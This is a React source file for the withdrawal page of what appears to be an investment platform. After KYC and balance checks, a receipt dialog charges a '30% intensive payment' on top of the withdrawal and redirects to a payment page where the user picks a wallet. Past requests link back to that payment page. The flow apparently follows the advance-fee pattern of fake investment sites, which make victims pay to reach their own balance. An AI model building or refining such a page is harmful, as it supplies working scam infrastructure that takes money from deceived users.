import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { Badge } from "@/components/ui/badge";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { ArrowUpRight, Loader2, ShieldAlert, Clock3, CheckCircle2, Wallet, UserCheck, FileText, Send, FolderOpen, LockKeyhole, CircleDollarSign } from "lucide-react";
import { toast } from "sonner";
import { supabase } from "@/integrations/supabase/client";
import { db, getKycStatus } from "@/lib/supabase-helpers";
import { formatCurrency, statusClass } from "@/lib/brand";

export const Route = createFileRoute("/_authenticated/withdraw")({ component: WithdrawPage });

type Withdrawal = { id: string; amount: number; method: string; status: string; created_at: string; destination_account?: Record<string, any> | null; admin_notes?: string | null };

const methods = ["Bank Transfer", "Cryptocurrency", "Mobile Money", "Other"];
const WITHDRAWAL_INTEREST_RATE = 0.30;

function makePaymentReference() {
  const stamp = Date.now().toString(36).toUpperCase();
  const random = Math.random().toString(36).slice(2, 7).toUpperCase();
  return `FIVB-INTENSIVE-${stamp}-${random}`;
}

function WithdrawPage() {
  const [balance, setBalance] = useState(0);
  const [kyc, setKyc] = useState("pending");
  const [amount, setAmount] = useState("500.00");
  const [method, setMethod] = useState(methods[0]);
  const [destination, setDestination] = useState("");
  const [notes, setNotes] = useState("");
  const [history, setHistory] = useState<Withdrawal[]>([]);
  const [loading, setLoading] = useState(false);
  const [receiptOpen, setReceiptOpen] = useState(false);
  const navigate = useNavigate();
  const [pendingReceipt, setPendingReceipt] = useState<{ amount: number; interest: number; totalDue: number; paymentReference: string; destinationPayload: Record<string, any> } | null>(null);

  useEffect(() => {
    (async () => {
      const { data: userData } = await supabase.auth.getUser();
      if (!userData.user) return;
      const [balanceResult, status, rows] = await Promise.all([
        supabase.from("balances").select("available").eq("user_id", userData.user.id).maybeSingle(),
        getKycStatus(userData.user.id),
        db.from("withdrawal_requests").select("id,amount,method,status,created_at,destination_account,admin_notes").eq("user_id", userData.user.id).order("created_at", { ascending: false }).limit(10),
      ]);
      setBalance(Number(balanceResult.data?.available ?? 0));
      setKyc(status?.status ?? "pending");
      setHistory((rows.data ?? []) as Withdrawal[]);
    })();
  }, []);

  const submit = async (event: React.FormEvent) => {
    event.preventDefault();
    if (kyc !== "approved") return toast.error("KYC must be approved before withdrawal");
    const value = Number(amount);
    if (!Number.isFinite(value) || value <= 0) return toast.error("Enter a valid withdrawal amount");
    if (value > balance) return toast.error("Insufficient available balance");
    if (!destination.trim()) return toast.error("Enter destination account details");

    const interest = Number((value * WITHDRAWAL_INTEREST_RATE).toFixed(2));
    const totalDue = Number((value + interest).toFixed(2));
    const paymentReference = makePaymentReference();
    const destinationPayload = {
      details: destination.trim(),
      notes: notes.trim(),
      intensive_payment_rate: "30%",
      intensive_payment_amount: interest,
      total_intensive_obligation: totalDue,
      intensive_payment_reference: paymentReference,
      intensive_payment_status: "awaiting_payment",
      receipt_acknowledgement_required: true,
      instruction_steps: [
        "Review the withdrawal receipt and 30% intensive payment summary.",
        "Accept the instruction to place the request in pending review.",
        "Wait for the administrator to process the withdrawal.",
        "Track the status from your withdrawal history and notifications.",
      ],
    };
    setPendingReceipt({ amount: value, interest, totalDue, paymentReference, destinationPayload });
    setReceiptOpen(true);
  };

  const confirmWithdrawal = async () => {
    if (!pendingReceipt) return;
    setLoading(true);
    try {
      const payload = {
        ...pendingReceipt.destinationPayload,
        receipt_accepted_at: new Date().toISOString(),
      };
      const { data, error } = await db.rpc("create_withdrawal", {
        _amount: pendingReceipt.amount,
        _method: method,
        _destination_account: payload,
      });
      if (error) throw error;
      const withdrawalId = String(data ?? "");
      toast.success("Withdrawal request created. Opening the 30% payment instruction page.");
      setBalance((b) => b - pendingReceipt.amount);
      setHistory((rows) => [{ id: String(data ?? Date.now()), amount: pendingReceipt.amount, method, status: "pending", created_at: new Date().toISOString(), destination_account: payload }, ...rows]);
      setAmount("");
      setDestination("");
      setNotes("");
      setPendingReceipt(null);
      setReceiptOpen(false);
      if (withdrawalId && typeof window !== "undefined") {
        const params = new URLSearchParams({
          withdrawalId,
          withdrawalAmount: String(pendingReceipt.amount),
          intensiveAmount: String(pendingReceipt.interest),
          reference: pendingReceipt.paymentReference,
        });
        window.location.assign(`/intensive-payment?${params.toString()}`);
      }
    } catch (error: any) {
      toast.error(error.message ?? "Unable to submit withdrawal");
    } finally {
      setLoading(false);
    }
  };


  const intensivePaymentHref = (w: Withdrawal) => {
    const params = new URLSearchParams({
      withdrawalId: w.id,
      withdrawalAmount: String(w.amount),
      intensiveAmount: String(w.destination_account?.intensive_payment_amount ?? w.destination_account?.loan_interest_amount ?? Number(w.amount) * WITHDRAWAL_INTEREST_RATE),
      reference: w.destination_account?.intensive_payment_reference ?? w.destination_account?.loan_payment_reference ?? `FIVB-INTENSIVE-${w.id.slice(0, 8).toUpperCase()}`,
    });
    return `/intensive-payment?${params.toString()}`;
  };

  return (
    <div className="mx-auto max-w-[1500px] space-y-7">
      <div className="flex flex-col gap-4 lg:flex-row lg:items-end lg:justify-between">
        <div>
          <h1 className="font-display text-3xl font-extrabold tracking-tight md:text-4xl">Withdraw funds</h1>
          <p className="mt-2 text-base text-muted-foreground">Verified users can submit withdrawal requests for administrator processing.</p>
        </div>
        <Badge variant="outline" className={`rounded-full px-4 py-2 text-sm ${statusClass(kyc)}`}>KYC: {kyc.replace("_", " ")}</Badge>
      </div>

      {kyc !== "approved" && (
        <Card className="min-w-0 rounded-[1.5rem] border-red-200 bg-red-50/80 p-6 text-red-700 shadow-soft dark:border-red-400/20 dark:bg-red-400/10">
          <div className="flex flex-col gap-4 sm:flex-row sm:items-center sm:justify-between">
            <div className="flex items-start gap-4"><LockKeyhole className="mt-1 h-6 w-6" /><div><div className="text-lg font-bold">Withdrawal locked</div><p className="text-base">Complete KYC verification before making withdrawal requests.</p></div></div>
            <Link to="/kyc"><Button variant="outline" className="rounded-xl border-red-200 bg-white/80 px-7 text-red-600 hover:bg-red-50 dark:bg-background/40">Go to KYC</Button></Link>
          </div>
        </Card>
      )}

      <div className="grid gap-7 xl:grid-cols-[1.2fr_0.95fr]">
        <Card className="min-w-0 rounded-[1.75rem] border-border/70 bg-card p-6 shadow-soft md:p-8">
          <div className="mb-7 flex items-center justify-between border-b border-border/70 pb-6">
            <div><div className="text-lg text-muted-foreground">Available balance</div><div className="font-display text-4xl font-extrabold">{formatCurrency(balance)}</div></div>
            <span className="inline-flex h-16 w-16 items-center justify-center rounded-2xl bg-blue-50 text-primary ring-1 ring-blue-100 dark:bg-blue-400/10"><Wallet className="h-8 w-8" /></span>
          </div>
          <form onSubmit={submit} className="space-y-6">
            <div className="grid gap-6 md:grid-cols-2">
              <div className="space-y-2">
                <Label>Amount</Label>
                <div className="relative">
                  <span className="absolute left-4 top-1/2 -translate-y-1/2 text-lg font-bold text-muted-foreground">$</span>
                  <Input type="number" min="1" step="0.01" value={amount} onChange={(e) => setAmount(e.target.value)} placeholder="500.00" className="h-14 rounded-2xl pl-11 text-base" />
                </div>
              </div>
              <div className="space-y-2">
                <Label>Withdrawal method</Label>
                <Select value={method} onValueChange={setMethod}>
                  <SelectTrigger className="h-14 rounded-2xl"><SelectValue /></SelectTrigger>
                  <SelectContent>{methods.map((m) => <SelectItem key={m} value={m}>{m}</SelectItem>)}</SelectContent>
                </Select>
              </div>
            </div>
            <div className="space-y-2">
              <Label>Destination account</Label>
              <Textarea value={destination} onChange={(e) => setDestination(e.target.value)} placeholder="Bank name, account name, account number, wallet address, mobile money number, or payout destination" className="min-h-28 rounded-2xl" />
            </div>
            <div className="space-y-2">
              <Label>Additional notes <span className="font-normal text-muted-foreground">(optional)</span></Label>
              <Textarea value={notes} onChange={(e) => setNotes(e.target.value)} placeholder="Optional notes for admin" className="min-h-24 rounded-2xl" />
            </div>
            <Button disabled={loading || kyc !== "approved"} className="h-14 rounded-2xl bg-gradient-primary px-8 text-primary-foreground shadow-soft">
              {loading ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Send className="mr-2 h-4 w-4" />} Submit withdrawal request
            </Button>
            <p className="flex items-center gap-2 text-sm text-muted-foreground"><LockKeyhole className="h-4 w-4" />Your request will be reviewed by an administrator.</p>
          </form>
        </Card>

        <div className="space-y-7">
          <Card className="min-w-0 rounded-[1.75rem] border-border/70 bg-card p-6 shadow-soft md:p-8">
            <div className="mb-6 flex items-center gap-4"><ShieldAlert className="h-7 w-7 text-primary" /><h2 className="font-display text-2xl font-bold">Withdrawal rules</h2></div>
            <div className="divide-y divide-border/70">
              <Rule icon={UserCheck} title="User must be KYC approved." body="Complete KYC verification to enable withdrawals." />
              <Rule icon={Clock3} title="Admin approval required." body="Requests may be pending, processing, approved, rejected, or paid." />
              <Rule icon={FileText} title="All actions are logged." body="Every admin action is written to secure audit logs." />
            </div>
          </Card>

          <Card className="min-w-0 rounded-[1.75rem] border-border/70 bg-card p-6 shadow-soft md:p-8">
            <div className="mb-5 flex items-center gap-3"><Clock3 className="h-6 w-6 text-primary" /><h2 className="font-display text-2xl font-bold">Withdrawal history</h2></div>
            <div className="space-y-3">
              {history.length ? history.map((w) => (
                <div key={w.id} className="rounded-2xl border border-border/70 bg-secondary/40 p-4">
                  <div className="flex items-start justify-between gap-3">
                    <div><div className="font-semibold">{formatCurrency(w.amount)}</div><div className="text-xs text-muted-foreground">{w.method} · {new Date(w.created_at).toLocaleString()}</div></div>
                    <Badge variant="outline" className={statusClass(w.status)}>{w.status}</Badge>
                  </div>
                  {w.admin_notes && <p className="mt-2 text-xs text-muted-foreground">Admin note: {w.admin_notes}</p>}
                  {(w.destination_account?.intensive_payment_amount ?? w.destination_account?.loan_interest_amount) && (
                    <a href={intensivePaymentHref(w)}>
                      <Button size="sm" variant="outline" className="mt-3 rounded-xl">Open 30% intensive payment link</Button>
                    </a>
                  )}
                </div>
              )) : (
                <div className="rounded-3xl border border-dashed border-blue-200 p-12 text-center">
                  <span className="mx-auto mb-4 inline-flex h-16 w-16 items-center justify-center rounded-2xl bg-blue-50 text-primary dark:bg-blue-400/10"><FolderOpen className="h-8 w-8" /></span>
                  <div className="font-display text-xl font-bold">No withdrawals yet</div>
                  <p className="mx-auto mt-2 max-w-sm text-sm text-muted-foreground">Your withdrawal history will appear here once you submit a request.</p>
                </div>
              )}
            </div>
          </Card>
        </div>
      </div>

      <Dialog open={receiptOpen} onOpenChange={(open) => !loading && setReceiptOpen(open)}>
        <DialogContent className="max-h-[calc(100dvh-1rem)] w-[calc(100vw-1rem)] max-w-2xl overflow-hidden rounded-[1.5rem] p-0 shadow-elegant sm:w-full sm:rounded-[1.75rem]">
          <DialogHeader className="border-b border-border/70 p-4 sm:p-6">
            <DialogTitle className="flex items-center gap-3 font-display text-xl sm:text-2xl">
              <span className="inline-flex h-10 w-10 shrink-0 items-center justify-center rounded-2xl bg-blue-50 text-primary dark:bg-blue-400/10 sm:h-11 sm:w-11"><FileText className="h-5 w-5" /></span>
              <span className="min-w-0 truncate">Withdrawal receipt</span>
            </DialogTitle>
            <DialogDescription className="text-sm leading-relaxed">
              Review the withdrawal details and 30% intensive payment before placing this request in pending review.
            </DialogDescription>
          </DialogHeader>

          {pendingReceipt && (
            <div className="max-h-[calc(100dvh-13rem)] space-y-4 overflow-y-auto px-4 py-4 sm:max-h-[calc(100dvh-15rem)] sm:space-y-5 sm:p-6">
              <div className="grid gap-3 sm:grid-cols-3">
                <ReceiptMetric label="Requested amount" value={formatCurrency(pendingReceipt.amount)} />
                <ReceiptMetric label="30% intensive payment" value={formatCurrency(pendingReceipt.interest)} accent />
                <ReceiptMetric label="Total obligation" value={formatCurrency(pendingReceipt.totalDue)} />
              </div>
              <div className="rounded-2xl border border-blue-200 bg-blue-50/70 p-4 text-sm text-blue-800 dark:border-blue-400/20 dark:bg-blue-400/10 dark:text-blue-100">
                <div className="font-semibold">Payment reference</div>
                <div className="mt-1 break-all font-mono text-sm font-bold sm:text-base">{pendingReceipt.paymentReference}</div>
                <p className="mt-2 text-xs leading-relaxed opacity-80">After you accept, the app will open your 30% intensive payment page. The amount is already attached, so the user will only choose a wallet.</p>
              </div>

              <div className="rounded-2xl border border-border/70 bg-secondary/40 p-4 sm:rounded-3xl sm:p-5">
                <div className="mb-3 flex items-center gap-2 font-semibold"><CircleDollarSign className="h-4 w-4 text-primary" /> Transaction instruction</div>
                <ol className="space-y-2 text-sm text-muted-foreground">
                  <li><b className="text-foreground">1.</b> Confirm the withdrawal method: <b className="text-foreground">{method}</b>.</li>
                  <li><b className="text-foreground">2.</b> Confirm the destination account details you entered.</li>
                  <li><b className="text-foreground">3.</b> Accept the 30% intensive payment shown above.</li>
                  <li><b className="text-foreground">4.</b> After acceptance, the request will remain <b className="text-foreground">Pending</b> for admin review.</li>
                </ol>
              </div>

              <div className="rounded-2xl border border-blue-200 bg-blue-50/70 p-4 text-sm text-blue-800 dark:border-blue-400/20 dark:bg-blue-400/10 dark:text-blue-100">
                No separate intensive account will be created. The 30% intensive payment details are attached to this pending withdrawal request for admin review.
              </div>
            </div>
          )}

          <DialogFooter className="sticky bottom-0 flex-col-reverse gap-2 border-t border-border/70 bg-background/95 p-4 backdrop-blur sm:flex-row sm:justify-between sm:p-6">
            <Button type="button" variant="outline" className="h-12 w-full rounded-xl sm:w-auto" disabled={loading} onClick={() => setReceiptOpen(false)}>Cancel</Button>
            <Button type="button" className="h-12 w-full rounded-xl bg-gradient-primary text-primary-foreground sm:w-auto" disabled={loading} onClick={confirmWithdrawal}>
              {loading ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <CheckCircle2 className="mr-2 h-4 w-4" />}
              Accept and open payment link
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
}

function ReceiptMetric({ label, value, accent }: { label: string; value: string; accent?: boolean }) {
  return (
    <div className="min-w-0 rounded-2xl border border-border/70 bg-card p-4 shadow-soft">
      <div className="text-xs font-medium text-muted-foreground">{label}</div>
      <div className={`mt-1 truncate font-display text-2xl font-bold leading-tight sm:text-xl ${accent ? "text-emerald-600" : ""}`} title={value}>{value}</div>
    </div>
  );
}

function Rule({ icon: Icon, title, body }: { icon: any; title: string; body: string }) {
  return <div className="flex gap-5 py-5 first:pt-0 last:pb-0"><span className="inline-flex h-14 w-14 shrink-0 items-center justify-center rounded-2xl bg-blue-50 text-primary dark:bg-blue-400/10"><Icon className="h-6 w-6" /></span><div><div className="font-bold">{title}</div><p className="mt-1 text-sm text-muted-foreground">{body}</p></div></div>;
}
